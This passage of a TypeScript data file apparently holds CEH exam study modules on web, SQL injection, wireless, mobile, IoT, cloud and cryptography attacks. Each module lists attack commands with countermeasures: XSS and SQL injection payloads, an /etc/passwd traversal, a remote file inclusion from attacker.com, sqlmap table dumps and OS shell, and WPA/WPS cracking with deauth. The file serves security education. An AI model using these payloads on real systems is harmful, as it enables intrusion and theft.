        ],
      },
    ],
    keyTools: ['Nikto', 'Nmap', 'curl', 'Wget', 'OpenSSL'],
    countermeasures: [
      'Remove default pages and test files',
      'Disable directory listing',
      'Run as low-privileged user',
      'Disable unused HTTP methods',
      'Security headers (CSP, HSTS)',
      'Regular patching',
    ],
  },
  {
    id: 'm14',
    number: 'M14',
    title: 'Hacking Web Applications',
    description: 'OWASP Top 10 vulnerabilities and web application attack techniques.',
    examWeight: '7%',
    estimatedQuestions: 9,
    duration: '4h 30m',
    topics: [
      {
        id: 'm14-t01',
        title: 'OWASP Top 10 (2021)',
        content: 'The most critical web application security risks.',
        keyPoints: [
          'A01: Broken Access Control',
          'A02: Cryptographic Failures',
          'A03: Injection',
          'A04: Insecure Design',
          'A05: Security Misconfiguration',
          'A06: Vulnerable Components',
          'A07: Identification Failures',
          'A08: Data Integrity Failures',
          'A09: Logging Failures',
          'A10: SSRF',
        ],
      },
      {
        id: 'm14-t02',
        title: 'Cross-Site Scripting (XSS)',
        content: 'Injecting malicious scripts into web pages viewed by other users.',
        commands: [
          { command: '<script>alert("XSS")</script>', description: 'Basic XSS payload' },
          { command: '"><script>alert(1)</script>', description: 'Breaking out of attributes' },
          { command: '\'><img src=x onerror=alert(1)>', description: 'Image tag payload' },
          { command: 'javascript:alert(1)', description: 'JavaScript protocol' },
        ],
      },
      {
        id: 'm14-t03',
        title: 'Cross-Site Request Forgery (CSRF)',
        content: 'Forcing users to execute unwanted actions on authenticated web applications.',
        keyPoints: [
          'Requires authenticated session',
          'Exploits trust in user\'s browser',
          'Mitigation: CSRF tokens',
          'SameSite cookies help prevent',
        ],
      },
      {
        id: 'm14-t04',
        title: 'File Upload Vulnerabilities',
        content: 'Exploiting insecure file upload functionality.',
        keyPoints: [
          'Bypass content-type validation',
          'Double extensions: shell.php.jpg',
          'Null byte injection: shell.php%00.jpg',
          'Magic bytes manipulation',
        ],
      },
      {
        id: 'm14-t05',
        title: 'Local/Remote File Inclusion',
        content: 'Including files from local or remote servers.',
        commands: [
          { command: '/index.php?page=../../../../etc/passwd', description: 'LFI to read files' },
          { command: '/index.php?page=http://attacker.com/shell.txt', description: 'RFI remote file' },
        ],
      },
    ],
    keyTools: ['Burp Suite', 'OWASP ZAP', 'Nikto', 'SQLMap', 'XSStrike'],
    countermeasures: [
      'Input validation and sanitization',
      'Parameterized queries',
      'Output encoding',
      'CSRF tokens',
      'Content Security Policy',
      'Regular security testing',
    ],
  },
  {
    id: 'm15',
    number: 'M15',
    title: 'SQL Injection',
    description: 'SQL injection types, techniques, and exploitation methods.',
    examWeight: '6%',
    estimatedQuestions: 7,
    duration: '4h 00m',
    topics: [
      {
        id: 'm15-t01',
        title: 'SQL Injection Types',
        content: 'Different categories of SQL injection vulnerabilities.',
        keyPoints: [
          'In-band (Classic): Error-based, Union-based',
          'Blind: Boolean-based, Time-based',
          'Out-of-band: DNS/HTTP channel',
          'Stacked queries: Multiple statements',
        ],
      },
      {
        id: 'm15-t02',
        title: 'Manual SQL Injection',
        content: 'Testing and exploiting SQL injection manually.',
        commands: [
          { command: "' OR '1'='1", description: 'Basic authentication bypass' },
          { command: "' OR 1=1--", description: 'Comment-based bypass' },
          { command: "' ORDER BY 1--", description: 'Determine column count' },
          { command: "' UNION SELECT NULL,NULL,NULL--", description: 'Union-based injection' },
          { command: "' AND SLEEP(5)--", description: 'Time-based blind SQLi' },
          { command: "' AND SUBSTRING(username,1,1)='a'--", description: 'Boolean-based blind' },
        ],
      },
      {
        id: 'm15-t03',
        title: 'SQLMap Automation',
        content: 'Using SQLMap for automated SQL injection.',
        commands: [
          { command: 'sqlmap -u "http://target.com/?id=1" --dbs', description: 'Enumerate databases' },
          { command: 'sqlmap -u "http://target.com/?id=1" --tables -D dbname', description: 'List tables' },
          { command: 'sqlmap -u "http://target.com/?id=1" --dump -D dbname -T users', description: 'Dump table data' },
          { command: 'sqlmap -u "http://target.com/?id=1" --os-shell', description: 'Get OS shell' },
        ],
      },
      {
        id: 'm15-t04',
        title: 'WAF Bypass Techniques',
        content: 'Techniques to bypass Web Application Firewalls.',
        commands: [
          { command: "sElEcT * FrOm users", description: 'Case variation' },
          { command: "UN/**/ION SEL/**/ECT", description: 'Comment injection' },
          { command: "%27 OR %31%3D%31", description: 'URL encoding' },
          { command: "sqlmap --tamper=space2comment,between", description: 'SQLMap tamper scripts' },
        ],
      },
    ],
    keyTools: ['SQLMap', 'Havij', 'jSQL', 'NoSQLMap', 'BBQSQL'],
    countermeasures: [
      'Parameterized queries (prepared statements)',
      'Input validation and sanitization',
      'Least privilege database accounts',
      'WAF with SQL injection rules',
      'Regular code reviews',
    ],
  },
  {
    id: 'm16',
    number: 'M16',
    title: 'Hacking Wireless Networks',
    description: 'Wireless standards, encryption, and attack techniques.',
    examWeight: '5%',
    estimatedQuestions: 6,
    duration: '3h 30m',
    topics: [
      {
        id: 'm16-t01',
        title: 'Wireless Standards',
        content: 'Evolution of WiFi standards and security.',
        keyPoints: [
          '802.11a: 5 GHz, 54 Mbps, WEP',
          '802.11b: 2.4 GHz, 11 Mbps, WEP',
          '802.11g: 2.4 GHz, 54 Mbps, WPA',
          '802.11n: 2.4/5 GHz, 600 Mbps, WPA2',
          '802.11ac: 5 GHz, 6.9 Gbps, WPA2/3',
          '802.11ax (WiFi 6): 2.4/5/6 GHz, 9.6 Gbps, WPA3',
        ],
      },
      {
        id: 'm16-t02',
        title: 'WPA/WPA2 Cracking',
        content: 'Attacking modern WiFi encryption.',
        commands: [
          { command: 'airmon-ng start wlan0', description: 'Enable monitor mode' },
          { command: 'airodump-ng wlan0mon', description: 'Scan for networks' },
          { command: 'airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon', description: 'Capture handshake' },
          { command: 'aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon', description: 'Deauth attack' },
          { command: 'aircrack-ng -w rockyou.txt capture-01.cap', description: 'Crack handshake' },
        ],
      },
      {
        id: 'm16-t03',
        title: 'WPS Attacks',
        content: 'Exploiting WiFi Protected Setup vulnerabilities.',
        commands: [
          { command: 'wash -i wlan0mon', description: 'Find WPS-enabled APs' },
          { command: 'reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv', description: 'Brute force WPS PIN' },
          { command: 'reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1', description: 'PixieDust attack' },
          { command: 'bully -b AA:BB:CC:DD:EE:FF -e ESSID -c CHANNEL wlan0mon', description: 'Bully WPS attack' },
        ],
      },
      {
        id: 'm16-t04',
        title: 'Evil Twin Attack',
        content: 'Creating rogue access points to capture credentials.',
        commands: [
          { command: 'hostapd-wpe hostapd-wpe.conf', description: 'Start evil twin AP' },
          { command: 'airbase-ng -e "FreeWiFi" -c 6 wlan0mon', description: 'Create fake AP' },
        ],
      },
    ],
    keyTools: ['Aircrack-ng', 'Wifite', 'Reaver', 'Bully', 'Bettercap', 'Kismet'],
    countermeasures: [
      'Use WPA3 or WPA2 with strong passwords',
      'Disable WPS',
      'Enable client isolation',
      'Use enterprise authentication (802.1X)',
      'Monitor for rogue APs',
    ],
  },
  {
    id: 'm17',
    number: 'M17',
    title: 'Hacking Mobile Platforms',
    description: 'Android and iOS security assessment techniques.',
    examWeight: '4%',
    estimatedQuestions: 5,
    duration: '3h 00m',
    topics: [
      {
        id: 'm17-t01',
        title: 'Android Security',
        content: 'Android platform vulnerabilities and testing.',
        commands: [
          { command: 'adb devices', description: 'List connected devices' },
          { command: 'adb shell', description: 'Access device shell' },
          { command: 'adb pull /sdcard/DCIM/ ./photos', description: 'Extract photos' },
          { command: 'apktool d app.apk', description: 'Decompile APK' },
          { command: 'jadx-gui app.apk', description: 'Decompile to Java' },
        ],
      },
      {
        id: 'm17-t02',
        title: 'Mobile Vulnerabilities',
        content: 'Common mobile application security issues.',
        keyPoints: [
          'Insecure data storage',
          'Insecure communication',
          'Improper authentication',
          'Insufficient input validation',
          'Client-side injection',
          'Insecure authorization',
          'Poor cryptography',
        ],
      },
      {
        id: 'm17-t03',
        title: 'Mobile Testing Tools',
        content: 'Tools for mobile application security testing.',
        commands: [
          { command: 'drozer console connect', description: 'Connect to Drozer' },
          { command: 'run app.package.list', description: 'List installed packages' },
          { command: 'run scanner.provider.injection -a com.target.app', description: 'Test for injection' },
        ],
      },
    ],
    keyTools: ['ADB', 'Apktool', 'JADX', 'Drozer', 'MobSF', 'Frida', 'Objection'],
    countermeasures: [
      'Code obfuscation',
      'Root detection',
      'Certificate pinning',
      'Secure data storage',
      'Encrypted communications',
    ],
  },
  {
    id: 'm18',
    number: 'M18',
    title: 'IoT & OT Hacking',
    description: 'Internet of Things and Operational Technology security.',
    examWeight: '3%',
    estimatedQuestions: 4,
    duration: '2h 45m',
    topics: [
      {
        id: 'm18-t01',
        title: 'IoT Attack Surface',
        content: 'Vulnerabilities in Internet of Things devices.',
        keyPoints: [
          'Insecure default credentials',
          'Unencrypted communication',
          'Firmware vulnerabilities',
          'Physical access attacks',
          'Insecure update mechanisms',
          'Lack of secure boot',
        ],
      },
      {
        id: 'm18-t02',
        title: 'IoT Discovery',
        content: 'Finding and identifying IoT devices.',
        commands: [
          { command: 'shodan search "has_screenshot:true port:23"', description: 'Find exposed telnet' },
          { command: 'nmap -p 1883 --script mqtt-subscribe 192.168.1.0/24', description: 'Discover MQTT brokers' },
          { command: 'mosquitto_sub -h 192.168.1.100 -t \'#\' -v', description: 'Subscribe to MQTT topics' },
        ],
      },
      {
        id: 'm18-t03',
        title: 'OT/SCADA',
        content: 'Operational Technology and industrial control systems.',
        commands: [
          { command: 'nmap --script s7-info -p 102 192.168.1.100', description: 'Siemens S7 enumeration' },
          { command: 'nmap --script modbus-discover -p 502 192.168.1.0/24', description: 'Modbus discovery' },
        ],
      },
    ],
    keyTools: ['Shodan', 'Censys', 'Binwalk', 'Firmadyne', 'Modbus-cli'],
    countermeasures: [
      'Network segmentation (air gap)',
      'Change default credentials',
      'Firmware updates',
      'Encrypted communications',
      'Physical security',
    ],
  },
  {
    id: 'm19',
    number: 'M19',
    title: 'Cloud Computing',
    description: 'Cloud service models, deployment, and security considerations.',
    examWeight: '4%',
    estimatedQuestions: 5,
    duration: '3h 00m',
    topics: [
      {
        id: 'm19-t01',
        title: 'Cloud Service Models',
        content: 'Different levels of cloud service responsibility.',
        keyPoints: [
          'IaaS: Infrastructure as a Service (EC2, VMs)',
          'PaaS: Platform as a Service (Elastic Beanstalk)',
          'SaaS: Software as a Service (Gmail, Office365)',
        ],
      },
      {
        id: 'm19-t02',
        title: 'AWS Security',
        content: 'Common AWS misconfigurations and testing.',
        commands: [
          { command: 'aws s3 ls', description: 'List S3 buckets' },
          { command: 'aws s3 ls s3://bucket-name', description: 'List bucket contents' },
          { command: 'aws ec2 describe-instances', description: 'List EC2 instances' },
          { command: 'curl http://169.254.169.254/latest/meta-data/', description: 'EC2 metadata access' },
        ],
      },
      {
        id: 'm19-t03',
        title: 'Cloud Enumeration Tools',
        content: 'Tools for auditing cloud configurations.',
        commands: [
          { command: 'ScoutSuite --provider aws', description: 'Multi-cloud auditing' },
          { command: 'Prowler -g', description: 'AWS security checks' },
          { command: 'Pacu', description: 'AWS exploitation framework' },
        ],
      },
    ],
    keyTools: ['AWS CLI', 'ScoutSuite', 'Prowler', 'Pacu', 'CloudMapper'],
    countermeasures: [
      'IAM least privilege',
      'Enable CloudTrail logging',
      'Encrypt data at rest and in transit',
      'Regular configuration audits',
      'Network segmentation with VPCs',
    ],
  },
  {
    id: 'm20',
    number: 'M20',
    title: 'Cryptography',
    description: 'Encryption, hashing, PKI, and cryptanalysis fundamentals.',
    examWeight: '5%',
    estimatedQuestions: 6,
    duration: '3h 30m',
    topics: [
      {
        id: 'm20-t01',
        title: 'Symmetric Encryption',
        content: 'Encryption using the same key for encryption and decryption.',
        keyPoints: [
          'AES: Current standard (128/192/256-bit)',
          'DES: 56-bit, broken, legacy only',
          '3DES: 112/168-bit, deprecated',
          'RC4: Stream cipher, broken (WEP)',
          'Blowfish: 32-448-bit, old applications',
        ],
      },
      {
        id: 'm20-t02',
        title: 'Asymmetric Encryption',
        content: 'Public-key cryptography using key pairs.',
        keyPoints: [
          'RSA: 1024-4096 bit, TLS, signatures',
          'ECC: 256-512 bit, mobile, TLS',
          'DSA: Digital signatures',
          'Diffie-Hellman: Key exchange',
        ],
      },
      {
        id: 'm20-t03',
        title: 'Hashing Algorithms',
        content: 'One-way functions for data integrity and password storage.',
        keyPoints: [
          'MD5: 128-bit, broken (collisions)',
          'SHA-1: 160-bit, deprecated',
          'SHA-256: 256-bit, secure',
          'SHA-3: Secure, different design',
          'bcrypt: Password hashing',
          'Argon2: Best for passwords',
        ],
      },
      {
        id: 'm20-t04',
        title: 'Cryptographic Tools',
        content: 'Tools for encryption, decryption, and analysis.',
        commands: [
          { command: 'openssl genrsa -out private.pem 2048', description: 'Generate RSA key' },
          { command: 'openssl s_client -connect target.com:443', description: 'Inspect TLS certificate' },
          { command: 'hash-identifier <hash>', description: 'Identify hash type' },
          { command: 'hashcat -m 0 hash.txt rockyou.txt', description: 'Crack MD5 hash' },
        ],
      },
      {
        id: 'm20-t05',
        title: 'PKI Concepts',
        content: 'Public Key Infrastructure components.',
        keyPoints: [
          'CA: Certificate Authority issues certificates',
          'CSR: Certificate Signing Request',
          'CRL: Certificate Revocation List',
          'OCSP: Online Certificate Status Protocol',
          'Chain of Trust: Root → Intermediate → End',
        ],
      },
    ],
    keyTools: ['OpenSSL', 'Hashcat', 'John', 'GPG', 'CyberChef'],
    countermeasures: [
      'Use strong encryption algorithms',
      'Proper key management',
      'Certificate pinning',
      'Regular certificate rotation',
      'Hash passwords with bcrypt/Argon2',
    ],
  },
];

// Helper functions
export const getModuleById = (moduleId: string): Module | undefined => {
  return cehModules.find((module) => module.id === moduleId);
};

export const searchModules = (query: string): Module[] => {
  const lowerQuery = query.toLowerCase();
  return cehModules.filter(
    (module) =>
      module.title.toLowerCase().includes(lowerQuery) ||
      module.description.toLowerCase().includes(lowerQuery) ||
      module.topics.some(
        (topic) =>
          topic.title.toLowerCase().includes(lowerQuery) ||
          topic.content.toLowerCase().includes(lowerQuery)
      )
  );
};

export const getTotalStudyHours = (): number => {
  return cehModules.reduce((total, module) => {
    const hours = parseInt(module.duration.split('h')[0]);
    return total + hours;
  }, 0);
};

export const getTotalTopics = (): number => {
  return cehModules.reduce((total, module) => total + module.topics.length, 0);
};
